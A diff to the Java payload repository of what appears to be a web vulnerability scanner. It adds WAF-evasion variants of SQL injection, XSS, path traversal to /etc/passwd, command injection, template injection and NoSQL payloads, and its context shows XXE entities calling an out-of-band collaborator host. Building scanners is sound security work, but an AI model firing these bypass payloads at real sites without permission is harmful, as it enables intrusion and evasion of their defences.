@@ -38,6 +38,63 @@ public class PayloadRepository {
         "http://google.com@127.0.0.1/"
     );
 
+    // --- Per-technique WAF-evasion extras (appended by DEEP depth via ParamValidator.deepExtras) ---
+    // Encoding / obfuscation / filter-bypass variants of the seed payloads, NOT new attack classes.
+    // ponytail: heuristic bypass list. Ceiling: NOT vetted against live WAFs yet — every entry
+    // still needs testing against a live Cloudflare AND Akamai block page before being relied on;
+    // drop any entry that gets blocked on its own (louder than the seed it's meant to sneak past).
+
+    public static final List<String> SQLI_EVASION = Arrays.asList(
+        "'/**/OR/**/1=1-- -",
+        "' oR 1=1-- -",
+        "'%09OR%091=1-- -",
+        "'/*!50000OR*/1=1-- -",
+        "%2527%20OR%25201=1",
+        "' || '1'='1"
+    );
+
+    public static final List<String> XSS_EVASION = Arrays.asList(
+        "<img src=x oNeRror=confirm(1)>",
+        "<svG/onload=confirm(1)>",
+        "<a href=\"javasc\nript:confirm(1)\">x</a>",
+        "<img src=x:x onerror=eval(atob('Y29uZmlybSgxKQ=='))>",
+        "<svg><script>confirm&#40;1&#41;</script>"
+    );
+
+    public static final List<String> PATH_TRAVERSAL_EVASION = Arrays.asList(
+        "..%c0%af..%c0%af..%c0%afetc/passwd",
+        "..%252f..%252f..%252fetc%252fpasswd",
+        "..%5c..%5c..%5cwindows%5cwin.ini",
+        "....\\/....\\/....\\/etc/passwd",
+        "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+    );
+
+    public static final List<String> CMDI_EVASION = Arrays.asList(
+        ";${IFS}id",
+        "||id",
+        "`i\\d`",
+        "$(printf id)",
+        "%0aid%0a",
+        ";i\"\"d"
+    );
+
+    // Arithmetic-only on purpose: the SSTI detector only looks for "49", and an RCE
+    // gadget payload (T(java.lang.Runtime)...) is exactly what a WAF signature-matches.
+    public static final List<String> SSTI_EVASION = Arrays.asList(
+        "${{7*7}}",
+        "{{7*'7'}}",
+        "{{ '7'*7 }}",
+        "<%= 7*7 %>",
+        "${7*7}<!---->"
+    );
+
+    public static final List<String> NOSQLI_EVASION = Arrays.asList(
+        "{\"$where\":\"1==1\"}",
+        "{\"$regex\":\".*\"}",
+        "[$ne]=1",
+        "{\"$gt\":undefined}"
+    );
+
     public static final List<String> XXE_OOB = Arrays.asList(
         "<?xml version=\"1.0\" ?>\n<!DOCTYPE root [\n<!ENTITY % ext SYSTEM \"http://{COLLABORATOR_PAYLOAD}\">\n%ext;\n]>\n<root/>",
         "<!DOCTYPE root [\n<!ENTITY \n  xxe \n  SYSTEM \n  \"http://{COLLABORATOR_PAYLOAD}\" >]>"
